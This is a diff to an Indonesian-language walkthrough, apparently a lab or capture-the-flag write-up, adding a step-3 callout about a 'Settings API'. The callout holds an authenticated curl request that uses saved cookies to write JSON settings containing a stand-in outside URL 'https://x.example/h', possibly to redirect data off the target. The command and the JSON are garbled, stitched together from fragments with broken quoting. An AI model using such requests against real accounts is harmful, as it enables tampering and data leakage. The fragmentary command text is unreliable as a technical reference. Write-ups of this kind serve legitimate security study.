@@ -2,6 +2,12 @@
 
 [← Overview](12-nexapartner.md) · [Index](index.md)
 
+> **Langkah 3/9 — Settings API.** Halaman /settings berisi JavaScript:
+>
+> **Titik penting:** curl -sS -b cookies.txt -H 'Content-Type: application/json' \ · https://x.example/h","digest":"daily","theme":"dark","emailNotifications":false}' · https://x.example/h","digest":"daily","theme":"dark"}}
+>
+> **Berikutnya:** [Analisis](12-nexapartner-04-analisis.md)
+
 ## 2.1 Settings API
 
 Halaman `/settings` berisi JavaScript:
